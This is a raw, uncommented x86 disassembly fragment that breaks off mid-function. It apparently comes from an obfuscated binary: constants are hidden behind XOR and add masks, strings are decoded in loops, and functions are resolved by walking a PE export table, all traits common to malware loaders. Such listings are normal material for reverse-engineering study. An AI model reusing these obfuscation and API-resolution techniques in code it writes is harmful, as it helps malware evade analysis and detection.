  41f6d9:	add    ecx,0x3272e2
  41f6df:	cmp    eax,ecx
  41f6e1:	jbe    0x41f70c
  41f6e3:	mov    eax,DWORD PTR [ebp+0x8]
  41f6e6:	add    eax,DWORD PTR [ebp-0x8]
  41f6e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41f6ec:	add    ecx,DWORD PTR [ebp-0x8]
  41f6ef:	mov    cx,WORD PTR [ecx]
  41f6f2:	mov    WORD PTR [eax],cx
  41f6f5:	mov    eax,DWORD PTR [ebp-0x4]
  41f6f8:	xor    eax,0x751089b
  41f6fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41f700:	lea    eax,[ecx+eax*1+0x3272e2]
  41f707:	mov    DWORD PTR [ebp-0x8],eax
  41f70a:	jmp    0x41f723
  41f70c:	mov    eax,DWORD PTR [ebp+0x8]
  41f70f:	add    eax,DWORD PTR [ebp-0x8]
  41f712:	mov    ecx,DWORD PTR [ebp+0xc]
  41f715:	add    ecx,DWORD PTR [ebp-0x8]
  41f718:	mov    cl,BYTE PTR [ecx]
  41f71a:	mov    BYTE PTR [eax],cl
  41f71c:	mov    eax,DWORD PTR [ebp-0x8]
  41f71f:	inc    eax
  41f720:	mov    DWORD PTR [ebp-0x8],eax
  41f723:	jmp    0x41f60c
  41f728:	leave  
  41f729:	ret    0xc
  41f72c:	push   ebp
  41f72d:	mov    ebp,esp
  41f72f:	sub    esp,0xc
  41f732:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f739:	push   esi
  41f73a:	mov    esi,eax
  41f73c:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41f743:	mov    edx,DWORD PTR [ebp-0x4]
  41f746:	mov    eax,0x751089b
  41f74b:	xor    edx,eax
  41f74d:	mov    ecx,0x3272e2
  41f752:	add    edx,ecx
  41f754:	cmp    esi,edx
  41f756:	je     0x41f798
  41f758:	push   ebx
  41f759:	push   edi
  41f75a:	mov    edx,DWORD PTR [ebp-0x8]
  41f75d:	mov    ebx,DWORD PTR [ebp+0x8]
  41f760:	xor    edx,eax
  41f762:	mov    edi,0xffcd8d1e
  41f767:	sub    edi,edx
  41f769:	add    esi,edi
  41f76b:	lea    edx,[esi-0x3272e2]
  41f771:	xor    edx,eax
  41f773:	mov    DWORD PTR [ebp-0xc],edx
  41f776:	mov    edx,DWORD PTR [ebp-0x4]
  41f779:	mov    edi,DWORD PTR [ebp-0xc]
  41f77c:	xor    dl,0x9b
  41f77f:	sub    dl,0x1e
  41f782:	xor    edi,eax
  41f784:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  41f78b:	mov    edx,DWORD PTR [ebp-0x4]
  41f78e:	xor    edx,eax
  41f790:	add    edx,ecx
  41f792:	cmp    esi,edx
  41f794:	jne    0x41f75a
  41f796:	pop    edi
  41f797:	pop    ebx
  41f798:	pop    esi
  41f799:	leave  
  41f79a:	ret    0x4
  41f79d:	push   ebp
  41f79e:	mov    ebp,esp
  41f7a0:	sub    esp,0x21c
  41f7a6:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41f7ad:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41f7b4:	mov    eax,DWORD PTR [ebp+0x10]
  41f7b7:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41f7bd:	push   esi
  41f7be:	push   edi
  41f7bf:	mov    edi,0x751089b
  41f7c4:	xor    eax,edi
  41f7c6:	mov    esi,0x3272e2
  41f7cb:	add    eax,esi
  41f7cd:	cmp    eax,ecx
  41f7cf:	mov    eax,DWORD PTR [ebp-0x4]
  41f7d2:	jne    0x41f7dd
  41f7d4:	xor    eax,edi
  41f7d6:	add    eax,esi
  41f7d8:	jmp    0x41f889
  41f7dd:	mov    ecx,DWORD PTR [ebp+0xc]
  41f7e0:	xor    eax,edi
  41f7e2:	add    eax,esi
  41f7e4:	cmp    eax,ecx
  41f7e6:	jne    0x41f7ed
  41f7e8:	mov    eax,DWORD PTR [ebp-0x4]
  41f7eb:	jmp    0x41f7d4
  41f7ed:	lea    eax,[ebp-0x21c]
  41f7f3:	mov    DWORD PTR [ebp-0x8],eax
  41f7f6:	mov    eax,DWORD PTR [ebp+0xc]
  41f7f9:	mov    DWORD PTR [ebp-0x10],eax
  41f7fc:	mov    eax,DWORD PTR [ebp-0x4]
  41f7ff:	xor    eax,edi
  41f801:	add    eax,esi
  41f803:	mov    DWORD PTR [ebp+0x10],eax
  41f806:	mov    eax,DWORD PTR [ebp+0xc]
  41f809:	push   ebx
  41f80a:	call   0x41f4e5
  41f80f:	mov    ebx,eax
  41f811:	mov    eax,DWORD PTR [ebp+0x8]
  41f814:	mov    eax,DWORD PTR [eax+0x14]
  41f817:	jmp    0x41f871
  41f819:	mov    eax,DWORD PTR [ebp+0xc]
  41f81c:	sub    eax,0x8
  41f81f:	mov    DWORD PTR [ebp-0xc],eax
  41f822:	mov    eax,DWORD PTR [ebp-0xc]
  41f825:	mov    eax,DWORD PTR [eax+0x28]
  41f828:	call   0x41f3cd
  41f82d:	mov    DWORD PTR [ebp+0x10],eax
  41f830:	push   DWORD PTR [ebp+0x10]
  41f833:	mov    edx,DWORD PTR [ebp-0x8]
  41f836:	call   0x41f574
  41f83b:	mov    eax,DWORD PTR [ebp-0x4]
  41f83e:	xor    eax,edi
  41f840:	add    eax,esi
  41f842:	cmp    eax,ebx
  41f844:	jne    0x41f84e
  41f846:	mov    eax,DWORD PTR [ebp-0x8]
  41f849:	call   0x41f45b
  41f84e:	mov    eax,DWORD PTR [ebp-0x14]
  41f851:	xor    eax,edi
  41f853:	add    eax,esi
  41f855:	push   eax
  41f856:	push   DWORD PTR [ebp-0x10]
  41f859:	mov    eax,DWORD PTR [ebp-0x8]
  41f85c:	call   0x41f187
  41f861:	mov    ecx,DWORD PTR [ebp-0x4]
  41f864:	xor    ecx,edi
  41f866:	add    ecx,esi
  41f868:	cmp    eax,ecx
  41f86a:	je     0x41f88f
  41f86c:	mov    eax,DWORD PTR [ebp+0xc]
  41f86f:	mov    eax,DWORD PTR [eax]
  41f871:	mov    DWORD PTR [ebp+0xc],eax
  41f874:	mov    eax,DWORD PTR [ebp+0x8]
  41f877:	mov    ecx,DWORD PTR [ebp+0xc]
  41f87a:	add    eax,0x14
  41f87d:	cmp    ecx,eax
  41f87f:	jne    0x41f819
  41f881:	mov    eax,DWORD PTR [ebp-0x4]
  41f884:	xor    eax,edi
  41f886:	add    eax,esi
  41f888:	pop    ebx
  41f889:	pop    edi
  41f88a:	pop    esi
  41f88b:	leave  
  41f88c:	ret    0xc
  41f88f:	mov    eax,DWORD PTR [ebp-0xc]
  41f892:	mov    eax,DWORD PTR [eax+0x18]
  41f895:	jmp    0x41f888
  41f897:	push   ebp
  41f898:	mov    ebp,esp
  41f89a:	mov    eax,DWORD PTR [ebp+0xc]
  41f89d:	sub    esp,0x10
  41f8a0:	cmp    DWORD PTR [ebp+0x8],0x0
  41f8a4:	push   ebx
  41f8a5:	push   esi
  41f8a6:	push   edi
  41f8a7:	je     0x41f95c
  41f8ad:	test   eax,eax
  41f8af:	je     0x41f95c
  41f8b5:	movzx  eax,WORD PTR [eax+0x20]
  41f8b9:	mov    ecx,eax
  41f8bb:	mov    DWORD PTR [ebp-0x10],eax
  41f8be:	xor    edx,edx
  41f8c0:	and    DWORD PTR [ebp-0x8],edx
  41f8c3:	mov    eax,0x8a8d
  41f8c8:	xor    ecx,eax
  41f8ca:	add    ecx,0x3b51
  41f8d0:	mov    DWORD PTR [ebp-0xc],ecx
  41f8d3:	and    DWORD PTR [ebp-0x4],0x0
  41f8d7:	xor    ecx,ecx
  41f8d9:	push   0x7e
  41f8db:	pop    edi
  41f8dc:	cmp    cx,WORD PTR [ebp-0xc]
  41f8e0:	jae    0x41f946
  41f8e2:	lea    esi,[edx-0x3b51]
  41f8e8:	xor    esi,eax
  41f8ea:	movzx  ecx,WORD PTR [ebp-0x4]
  41f8ee:	mov    ebx,DWORD PTR [ebp+0xc]
  41f8f1:	lea    ecx,[ebx+ecx*4]
  41f8f4:	cmp    WORD PTR [ecx+0x2],si
  41f8f8:	jne    0x41f931
  41f8fa:	movzx  ecx,WORD PTR [ecx]
  41f8fd:	mov    edi,0x4e22
  41f902:	cmp    cx,di
  41f905:	jne    0x41f913
  41f907:	mov    ebx,DWORD PTR [ebp+0x8]
  41f90a:	movzx  edi,dx
  41f90d:	cmp    BYTE PTR [edi+ebx*1],0x0
  41f911:	je     0x41f940
  41f913:	mov    ebx,DWORD PTR [ebp+0x8]
  41f916:	movzx  edi,dx
  41f919:	movsx  di,BYTE PTR [edi+ebx*1]
  41f91e:	mov    ebx,0x3b51
  41f923:	sub    di,bx
  41f926:	xor    di,ax
  41f929:	cmp    cx,di
  41f92c:	je     0x41f940
  41f92e:	push   0x7c
  41f930:	pop    edi
  41f931:	inc    DWORD PTR [ebp-0x4]
  41f934:	mov    cx,WORD PTR [ebp-0xc]
  41f938:	cmp    WORD PTR [ebp-0x4],cx
  41f93c:	jb     0x41f8ea
  41f93e:	jmp    0x41f946
  41f940:	inc    DWORD PTR [ebp-0x8]
  41f943:	push   0x7d
  41f945:	pop    edi
  41f946:	mov    esi,DWORD PTR [ebp+0x8]
  41f949:	movzx  ecx,dx
  41f94c:	cmp    BYTE PTR [ecx+esi*1],0x0
  41f950:	je     0x41f965
  41f952:	inc    edx
  41f953:	cmp    edi,0x7c
  41f956:	jne    0x41f8d3
  41f95c:	xor    eax,eax
  41f95e:	pop    edi
  41f95f:	pop    esi
  41f960:	pop    ebx
  41f961:	leave  
  41f962:	ret    0x8
  41f965:	mov    ecx,DWORD PTR [ebp-0x8]
  41f968:	add    ecx,0xffffc4af
  41f96e:	xor    cx,ax
  41f971:	xor    eax,eax
  41f973:	cmp    cx,WORD PTR [ebp-0x10]
  41f977:	sete   al
  41f97a:	jmp    0x41f95e
  41f97c:	push   ebp
  41f97d:	mov    ebp,esp
  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
